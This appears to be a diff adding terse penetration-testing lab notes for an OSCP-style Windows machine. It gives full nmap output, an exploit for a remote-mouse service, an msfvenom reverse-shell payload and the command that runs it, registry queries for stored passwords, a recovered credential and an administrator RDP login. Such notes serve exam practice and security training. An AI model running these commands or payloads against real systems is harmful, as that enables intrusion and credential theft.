@@ -1,0 +1,60 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.157.145 > 145.txt
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Samuel's Personal Site
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+1978/tcp open  unisql?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
+|_    system windows 6.2
+3389/tcp open  ms-wbt-server Microssoft Terminal Services
+|_ssl-date: 2026-04-25T02:54:31+00:00; +1s from scanner time.
+| ssl-cert: Subject: commonName=oscp
+| Issuer: commonName=oscp
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2026-04-24T02:41:57
+| Not valid after:  2026-10-24T02:41:57
+| MD5:   98fc:c015:011c:7101:b440:bef5:1624:fb1b
+|_SHA-1: 83cd:6d29:d3a0:d415:c52b:8f82:7658:c133:ba5e:d3a0
+| rdp-ntlm-info: 
+|   Target_Name: OSCP
+|   NetBIOS_Domain_Name: OSCP
+|   NetBIOS_Computer_Name: OSCP
+|   DNS_Domain_Name: oscp
+|   DNS_Computer_Name: oscp
+|   Product_Version: 10.0.19041
+|_  System_Time: 2026-04-25T02:53:50+00:00
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+$ searchsploit Remote mouse
+WiFi Mouse 1.7.8.5 - Remote Code Execution(v2)          | windows/remote/50972.py
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.201 LPORT=4445 -f exe -o test64.exe
+$ python3 50972.py 192.168.157.145 192.168.45.201 test64.exe
+get a reverse shell
+Found PUTTY has installed at C:\Program Files on this machine
+https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.002/T1552.002.md
+T1552.002 - Unsecured Credentials: Credentials in Registry
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s
+
+zachary:Th3R@tC@tch3r
+
+rdp in. zachary is administrator
+
+
+
